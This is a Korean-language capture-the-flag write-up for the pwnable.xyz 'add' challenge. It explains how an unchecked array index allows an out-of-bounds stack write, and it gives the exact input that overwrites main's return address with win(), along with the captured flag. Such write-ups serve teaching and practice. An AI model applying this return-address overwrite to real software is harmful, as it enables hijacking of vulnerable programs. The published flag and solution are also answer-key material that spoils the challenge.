# [pwnable.xyz] add

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> We did some subtraction, now let's do some addition.
>
> Release: [add.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8908205/add.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/173801991-a9f65b12-6644-4c50-8821-8fe238f60005.png)

## Analysis

### win()

```c
int win()
{
  return system("cat /flag");
}
```

`win()`이 실행되면 플래그를 획득할 수 있다.

### main()

```c
  while ( 1 )
  {
    num1 = 0LL;
    num2 = 0LL;
    num3 = 0LL;
    memset(buf, 0, 0x50uLL);
    printf("Input: ");
    if ( (unsigned int)__isoc99_scanf("%ld %ld %ld", &num1, &num2, &num3) != 3 )
      break;
    buf[num3] = num1 + num2;
    printf("Result: %ld", buf[num3]);
  }
```

숫자 3개를 입력받아서, `buf[num3]`에 `num1 + num2`의 값을 넣는다. `buf`는 스택의 지역 변수인데, `num3`에는 임의의 수를 넣을 수 있으므로, 스택의 원하는 위치에 원하는 값을 넣을 수 있다.

만약 `scanf()`의 반환값이 3이 아니면 반복문을 빠져나가서 `main()`이 종료되는데, 이를 위해서는 입력에 숫자가 아니라 문자를 넣으면 된다.

## Exploit

`main()`의 return address를 `win()`의 주소로 덮어쓰고 반복문을 빠져나가면 플래그를 획득할 수 있다.

`buf`는 `rbp-0x60`부터 시작하고 return address는 `rbp+0x8`에 위치하므로, `buf[13]`을 덮어쓰면 된다.

Index에 해당하는 `num3`에는 `13`을 넣고, `num1`에는 `win()`의 주소인 `0x400822`(`4196386`), `num2`에는 `0`을 넣으면 된다.

```
$ nc svc.pwnable.xyz 30002
Input: 4196386 0 13
Result: 4196386Input: a
FLAG{easy_00b_write}
```